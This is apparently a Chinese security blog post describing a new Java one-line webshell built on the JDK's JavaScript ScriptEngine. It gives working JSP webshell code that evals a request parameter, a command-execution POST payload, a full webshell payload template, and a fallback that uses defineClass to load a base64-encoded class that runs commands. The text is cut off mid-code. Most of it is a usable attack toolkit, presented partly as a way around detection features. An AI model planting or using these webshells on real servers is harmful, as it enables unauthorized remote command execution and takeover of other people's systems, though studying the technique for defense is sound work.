    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><blockquote><p>本文首发于先知社区</p></blockquote><h2 id="前言">前言</h2><p>一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。</p><h2 id="基本原理">基本原理</h2><ol><li>Java没有eval函数，Js有eval函数，可以把字符串当代码解析。</li><li>Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。</li><li>ScriptEngine支持在Js中调用Java的对象。</li></ol><p>综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。</p><p>ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java 6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。</p><p>如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？</p><p>在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。</p><h3 id="获取脚本引擎">获取脚本引擎</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//通过脚本名称获取：</span><br><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;JavaScript&quot;);  //简写为js也可以</span><br><span class="line">//通过文件扩展名获取： </span><br><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;);  </span><br><span class="line">//通过MIME类型来获取： </span><br><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(&quot;text/javascript&quot;);</span><br></pre></td></tr></table></figure><h3 id="绑定对象">绑定对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">engine.put(&quot;request&quot;, request);</span><br><span class="line">engine.put(&quot;response&quot;, response);</span><br><span class="line">engine.eval(request.getParameter(&quot;mr6&quot;));</span><br></pre></td></tr></table></figure><p>或者通过eval的重载函数，直接把对象通过一个HashMap放进去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;ant&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123;</span><br><span class="line">put(&quot;response&quot;, response);</span><br><span class="line">put(&quot;request&quot;, request);</span><br><span class="line">&#125;&#125;))</span><br></pre></td></tr></table></figure><h3 id="eval">eval</h3><p>综合上面两步，有很多种写法，例如：</p><p>shell.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">     engine.put(&quot;request&quot;, request);</span><br><span class="line">     engine.put(&quot;response&quot;, response);</span><br><span class="line">     engine.eval(request.getParameter(&quot;mr6&quot;));</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>或者直接缩写成一句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">     new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;mr6&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123;</span><br><span class="line">            put(&quot;response&quot;, response);</span><br><span class="line">            put(&quot;request&quot;, request);</span><br><span class="line">        &#125;&#125;));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>以执行命令为例：</p><p>POST：mr6=java.lang.Runtime.getRuntime().exec(“calc”);</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png" alt="image.png"></p><p>即可达到命令执行的效果。</p><h2 id="基本语法">基本语法</h2><p>翻阅文档比较枯燥，这里挑一些用到的说一说。</p><p>感兴趣的同学也可以看一下原文档：<a href="https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf</a></p><h3 id="调用Java方法">调用Java方法</h3><p>前面加上全限定类名即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var s = [3];</span><br><span class="line">s[0] = &quot;cmd&quot;;</span><br><span class="line">s[1] = &quot;/c&quot;;</span><br><span class="line">s[2] = &quot;whoami&quot;;//yzddmr6</span><br><span class="line">var p = java.lang.Runtime.getRuntime().exec(s);</span><br><span class="line">var sc = new java.util.Scanner(p.getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">var result = sc.hasNext() ? sc.next() : &quot;&quot;;</span><br><span class="line">sc.close();</span><br></pre></td></tr></table></figure><h3 id="导入Java类型">导入Java类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var Vector = java.util.Vector;</span><br><span class="line">var JFrame = Packages.javax.swing.JFrame;</span><br><span class="line"> </span><br><span class="line"> //这种写法仅仅支持Nashorn，Rhino并不支持</span><br><span class="line">var Vector = Java.type(&quot;java.util.Vector&quot;)</span><br><span class="line">var JFrame = Java.type(&quot;javax.swing.JFrame&quot;)</span><br></pre></td></tr></table></figure><h3 id="创建Java类型的数组">创建Java类型的数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Rhino</span><br><span class="line">var Array = java.lang.reflect.Array</span><br><span class="line">var intClass = java.lang.Integer.TYPE</span><br><span class="line">var array = Array.newInstance(intClass, 8)</span><br><span class="line"></span><br><span class="line">// Nashorn</span><br><span class="line">var IntArray = Java.type(&quot;int[]&quot;)</span><br><span class="line">var array = new IntArray(8)</span><br></pre></td></tr></table></figure><h3 id="导入Java类">导入Java类</h3><p>默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。</p><p>这个时候大聪明Mozilla Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage 方法，可以导入指定的Java包。</p><ul><li>importClass 导入指定Java的类，现在推荐用Java.type</li><li>importPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter</li></ul><p>这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load(&quot;nashorn:mozilla_compat.js&quot;);</span><br><span class="line"></span><br><span class="line">importClass(java.util.HashSet);</span><br><span class="line">var set = new HashSet();</span><br><span class="line"></span><br><span class="line">importPackage(java.util);</span><br><span class="line">var list = new ArrayList();</span><br></pre></td></tr></table></figure><p>在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// create JavaImporter with specific packages and classes to import</span><br><span class="line"></span><br><span class="line">var SwingGui = new JavaImporter(javax.swing,</span><br><span class="line">                            javax.swing.event,</span><br><span class="line">                            javax.swing.border,</span><br><span class="line">                            java.awt.event);</span><br><span class="line">with (SwingGui) &#123;</span><br><span class="line">    // 在with里面才可以调用swing里面的类，防止污染</span><br><span class="line">    var mybutton = new JButton(&quot;test&quot;);</span><br><span class="line">    var myframe = new JFrame(&quot;test&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法调用与重载">方法调用与重载</h3><p>方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var System = Java.type(&apos;java.lang.System&apos;);</span><br><span class="line">System.out.println(&apos;Hello, World&apos;);    // Hello, World</span><br><span class="line">System.out[&apos;println&apos;](&apos;Hello, World&apos;); // Hello, World</span><br></pre></td></tr></table></figure><p>Java支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var System = Java.type(&apos;java.lang.System&apos;);</span><br><span class="line">System.out[&apos;println&apos;](3.14);          // 3.14</span><br><span class="line">System.out[&apos;println(double)&apos;](3.14);  // 3.14</span><br><span class="line">System.out[&apos;println(int)&apos;](3.14);     // 3</span><br></pre></td></tr></table></figure><h2 id="Payload结构设计">Payload结构设计</h2><p>详情写在注释里了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">//导入基础拓展</span><br><span class="line">try &#123;</span><br><span class="line">  load(&quot;nashorn:mozilla_compat.js&quot;);</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br><span class="line">//导入常见包</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.java.io);</span><br><span class="line"></span><br><span class="line">var output = new StringBuffer(&quot;&quot;); //输出</span><br><span class="line">var cs = &quot;$&#123;jspencode&#125;&quot;; //设置字符集编码</span><br><span class="line">var tag_s = &quot;$&#123;tag_s&#125;&quot;; //开始符号</span><br><span class="line">var tag_e = &quot;$&#123;tag_e&#125;&quot;; //结束符号</span><br><span class="line">try &#123;</span><br><span class="line">  response.setContentType(&quot;text/html&quot;);</span><br><span class="line">  request.setCharacterEncoding(cs);</span><br><span class="line">  response.setCharacterEncoding(cs);</span><br><span class="line">  function decode(str) &#123;</span><br><span class="line">    //参数解码</span><br><span class="line">    str = str.substr(2);</span><br><span class="line">    var bt = Base64DecodeToByte(str);</span><br><span class="line">    return new java.lang.String(bt, cs);</span><br><span class="line">  &#125;</span><br><span class="line">  function Base64DecodeToByte(str) &#123;</span><br><span class="line">    importPackage(Packages.sun.misc);</span><br><span class="line">    importPackage(Packages.java.util);</span><br><span class="line">    var bt;</span><br><span class="line">    try &#123;</span><br><span class="line">      bt = new BASE64Decoder().decodeBuffer(str);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      bt = Base64.getDecoder().decode(str);</span><br><span class="line">    &#125;</span><br><span class="line">    return bt;</span><br><span class="line">  &#125;</span><br><span class="line">  function asoutput(str) &#123;</span><br><span class="line">    //回显加密</span><br><span class="line">    return str;</span><br><span class="line">  &#125;</span><br><span class="line">  function func(z1) &#123;</span><br><span class="line">    //eval function</span><br><span class="line"></span><br><span class="line">    return z1;</span><br><span class="line">  &#125;</span><br><span class="line">  output.append(func(z1)); //添加功能函数回显</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">  output.append(&quot;ERROR:// &quot; + e.toString()); //输出错误</span><br><span class="line">&#125;</span><br><span class="line">try &#123;</span><br><span class="line">  response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="语法问题的坑">语法问题的坑</h2><h3 id="两种语言对象间的相互转换">两种语言对象间的相互转换</h3><p>要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。</p><p>在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。</p><p>正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。</p><p>下面附上类型对比表：</p><table><thead><tr><th>JavaScript Value</th><th>JavaScript Type</th><th>Java Type</th><th>Is Scriptable</th><th>Is Function</th></tr></thead><tbody><tr><td>{a:1, b:[‘x’,‘y’]}</td><td>object</td><td>org.mozilla.javascript.NativeObject</td><td><strong>+</strong></td><td>-</td></tr><tr><td>[1,2,3]</td><td>object</td><td>org.mozilla.javascript.NativeArray</td><td><strong>+</strong></td><td>-</td></tr><tr><td>1</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>1.2345</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>NaN</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>Infinity</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>-Infinity</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>true</td><td>boolean</td><td>java.lang.Boolean</td><td>-</td><td>-</td></tr><tr><td>“test”</td><td>string</td><td>java.lang.String</td><td>-</td><td>-</td></tr><tr><td>null</td><td>object</td><td>null</td><td>-</td><td>-</td></tr><tr><td>undefined</td><td>undefined</td><td>org.mozilla.javascript.Undefined</td><td>-</td><td>-</td></tr><tr><td>function () { }</td><td>function</td><td>org.mozilla.javascript.gen.c1</td><td><strong>+</strong></td><td><strong>+</strong></td></tr><tr><td>/.*/</td><td>object</td><td>org.mozilla.javascript.regexp.NativeRegExp</td><td><strong>+</strong></td><td><strong>+</strong></td></tr></tbody></table><h3 id="Rhino-Nashorn解析的差异">Rhino/Nashorn解析的差异</h3><p>这也是当时一个坑点，看下面一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var readonlyenv = System.getenv();</span><br><span class="line">var cmdenv = new java.util.HashMap(readonlyenv);</span><br><span class="line">var envs = envstr.split(&quot;\\|\\|\\|asline\\|\\|\\|&quot;);</span><br><span class="line">for (var i = 0; i &lt; envs.length; i++) &#123;</span><br><span class="line">  var es = envs[i].split(&quot;\\|\\|\\|askey\\|\\|\\|&quot;);</span><br><span class="line">  if (es.length == 2) &#123;</span><br><span class="line">    cmdenv.put(es[0], es[1]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var e = [];</span><br><span class="line">var i = 0;</span><br><span class="line">print(cmdenv+&apos;\n&apos;);</span><br><span class="line">for (var key in cmdenv) &#123;//关键</span><br><span class="line">  print(&quot;key: &quot;+key+&quot;\n&quot;);</span><br><span class="line">  e[i] = key + &quot;=&quot; + cmdenv[key];</span><br><span class="line">  i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中cmdenv是个HashMap，这段代码在Java 8中Nashorn引擎可以正常解析，var key in cmdenv的时候把cmdenv的键给输出了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png" alt="image.png"></p><p>但是在Java 6下运行时，Rhino把他当成了一个js对象，把其属性输出了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png" alt="image.png"></p><p>所以涉及到这种混合写法就会有异议，不同的引擎有不同的解释。</p><p>解决办法使用Java迭代器即可，不掺杂js的写法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var i = 0;</span><br><span class="line">var iter = cmdenv.keySet().iterator();</span><br><span class="line">while (iter.hasNext()) &#123;</span><br><span class="line">  var key = iter.next();</span><br><span class="line">  var val = cmdenv.get(key);</span><br><span class="line">  //print(&quot;\nkey:&quot; + key);</span><br><span class="line">  //print(&quot;\nval:&quot; + val);</span><br><span class="line">  e[i] = key + &quot;=&quot; + val;</span><br><span class="line">  i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反射的坑">反射的坑</h3><p>在Java中，如果涉及到不同版本之间类的包名不一样，我们通常不能直接导入，而要使用反射的写法。</p><p>例如base64解码的时候，Java的写法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public byte[] Base64DecodeToByte(String str) &#123;</span><br><span class="line">    byte[] bt = null;</span><br><span class="line">    String version = System.getProperty(&quot;java.version&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            bt = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            bt = (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125;</span><br><span class="line">        return bt;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return new byte[]&#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改写成js风格后，发现会有一些奇奇怪怪的BUG。（后来发现反射其实也可以实现，导入Java类型然后再传入反射参数即可，就是比较麻烦）</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function test(str) &#123;</span><br><span class="line">  var bt = null;</span><br><span class="line">  var version = System.getProperty(&quot;java.version&quot;);</span><br><span class="line"></span><br><span class="line">  if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123;</span><br><span class="line">    var clazz = java.lang.Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">    var decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">    bt = decoder</span><br><span class="line">      .getClass()</span><br><span class="line">      .getMethod(&quot;decode&quot;, java.lang.String.class)</span><br><span class="line">      .invoke(decoder, str);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    var clazz = java.lang.Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">    bt = clazz</span><br><span class="line">      .getMethod(&quot;decodeBuffer&quot;, java.lang.String.class)</span><br><span class="line">      .invoke(clazz.newInstance(), str);</span><br><span class="line">  &#125;</span><br><span class="line">  return bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在Js中，我们并不需要这么麻烦。上面提到过如果importPackage了一个不存在的包名，Js引擎会将这个错误给忽略，并且由于Js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的。大大减小了payload编写的复杂度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function Base64DecodeToByte(str) &#123;</span><br><span class="line">  importPackage(Packages.sun.misc);</span><br><span class="line">  importPackage(Packages.java.util);</span><br><span class="line">  var bt;</span><br><span class="line">  try &#123;</span><br><span class="line">    bt = new BASE64Decoder().decodeBuffer(str);</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    bt = Base64.getDecoder().decode(str);</span><br><span class="line">  &#125;</span><br><span class="line">  return bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="保底操作">保底操作</h2><p>理论上，我们可以用js引擎的一句话实现所有字节码一句话的功能，退一万步讲，如果有些功能实在不好实现，或者说想套用现有的payload应该怎么办呢。</p><p>我们可以用java调用js后，再调用defineClass来实现：</p><p>编写一个命令执行的类：calc.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class calc &#123;</span><br><span class="line">    public calc(String cmd)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后base64一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; base64 -w 0 calc.class</span><br><span class="line">yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIA</span><br></pre></td></tr></table></figure><p>填入下方payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  load(&quot;nashorn:mozilla_compat.js&quot;);</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.java.io);</span><br><span class="line">var output = new StringBuffer(&quot;&quot;);</span><br><span class="line">var cs = &quot;UTF-8&quot;;</span><br><span class="line">response.setContentType(&quot;text/html&quot;);</span><br><span class="line">request.setCharacterEncoding(cs);</span><br><span class="line">response.setCharacterEncoding(cs);</span><br><span class="line">function Base64DecodeToByte(str) &#123;</span><br><span class="line">  importPackage(Packages.sun.misc);</span><br><span class="line">  importPackage(Packages.java.util);</span><br><span class="line">  var bt;</span><br><span class="line">  try &#123;</span><br><span class="line">    bt = new BASE64Decoder().decodeBuffer(str);</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    bt = new Base64().getDecoder().decode(str);</span><br><span class="line">  &#125;</span><br><span class="line">  return bt;</span><br><span class="line">&#125;</span><br><span class="line">function define(Classdata, cmd) &#123;</span><br><span class="line">  var classBytes = Base64DecodeToByte(Classdata);</span><br><span class="line">  var byteArray = Java.type(&quot;byte[]&quot;);</span><br><span class="line">  var int = Java.type(&quot;int&quot;);</span><br><span class="line">  var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">    &quot;defineClass&quot;,</span><br><span class="line">    byteArray.class,</span><br><span class="line">    int.class,</span><br><span class="line">    int.class</span><br><span class="line">  );</span><br><span class="line">  defineClassMethod.setAccessible(true);</span><br><span class="line">  var cc = defineClassMethod.invoke(</span><br><span class="line">    Thread.currentThread().getContextClassLoader(),</span><br><span class="line">    classBytes,</span><br><span class="line">    0,</span><br><span class="line">    